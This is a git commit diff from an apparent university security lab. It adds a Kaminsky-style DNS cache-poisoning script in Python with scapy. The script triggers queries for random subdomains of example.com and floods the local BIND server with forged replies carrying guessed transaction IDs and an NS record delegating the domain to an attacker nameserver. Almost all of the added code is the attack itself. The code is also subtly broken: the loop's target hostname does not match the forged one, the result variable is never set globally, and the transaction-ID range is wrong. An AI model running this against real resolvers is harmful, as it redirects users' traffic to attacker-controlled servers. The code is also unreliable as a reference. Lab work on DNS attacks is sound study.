d1ba218cf2fb381ee674c5f26d9bb1f04f82258c
zandent <simon.zhao@mail.utoronto.ca>
2021-03-21 01:26:22 -0400

    update part5

--- lab4/part4_starter.py
+++ lab4/part4_starter.py
@@ -7,6 +7,7 @@ from random import randint, choice
 from string import ascii_lowercase, digits
 from subprocess import call
 
+import threading
 
 parser = argparse.ArgumentParser()
 parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
@@ -24,6 +25,7 @@ dns_port = args.dns_port
 # port that your bind uses to send its DNS queries
 my_query_port = args.query_port
 
+
 '''
 Generates random strings of length 10.
 '''
@@ -36,24 +38,61 @@ Generates random 8-bit integer.
 def getRandomTXID():
 	return randint(0, 256)
 
+fakename = getRandomSubDomain() + getRandomSubDomain()
+
+result_NS = ""
 '''
 Sends a UDP packet.
 '''
 def sendPacket(sock, packet, ip, port):
     sock.sendto(str(packet), (ip, port))
 
+def sendDNSReply():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+    newNS=DNSRR(rrname="example.com", ttl=3600, type='NS', rdata="ns.dbslabattacker.net")
+    tryPacket = DNS(rd=1, id=getRandomTXID(), qd=DNSQR(qname=fakename+'.example.com'), ns=newNS)
+    #print "\n***** Attacker Packet Sent from Remote Server *****"
+    #tryPacket.show2()
+    #print "\n***** Attacker Packet Sent to Remote Server *****"
+    sendPacket(sock, tryPacket, my_ip, my_query_port)
+
+class Blinky(threading.Thread):
+    def __init__(self):
+        threading.Thread.__init__(self)
+        self.daemon = True
+        self._finished = False
+
+    def __enter__(self):
+        self.start()
+
+    def __exit__(self, exc_type, exc_val, exc_tb):
+        self.stop()
+
+    def run(self):
+        while not self._finished:
+	    sendDNSReply()
+
+    def stop(self):
+        self._finished = True
+
 '''
 Example code that sends a DNS query using scapy.
 '''
 def exampleSendDNSQuery():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
-    dnsPacket = DNS(rd=1, qd=DNSQR(qname='example.com'))
+    dnsPacket = DNS(rd=1, qd=DNSQR(qname=fakename+'.example.com'))
     sendPacket(sock, dnsPacket, my_ip, my_port)
+    # tryPacket = DNS(rd=1, id=getRandomTXID(), qd=DNSQR(qname=fakename+'example.com'), ns=DNSRR(rrname="example.com", rdata="ns.dbslabattacker.net"))
     response = sock.recv(4096)
     response = DNS(response)
     print "\n***** Packet Received from Remote Server *****"
     print response.show()
+    print 'result NS is ' + response[DNS].ns[DNSRR].rdata
     print "***** End of Remote Server Packet *****\n"
+    result_NS = response[DNS].ns[DNSRR].rdata
 
 if __name__ == '__main__':
-    exampleSendDNSQuery()
+	while result_NS != "ns.dnslabattacker.net":
+		fakename = getRandomSubDomain() + getRandomSubDomain()
+		with Blinky():
+			exampleSendDNSQuery()
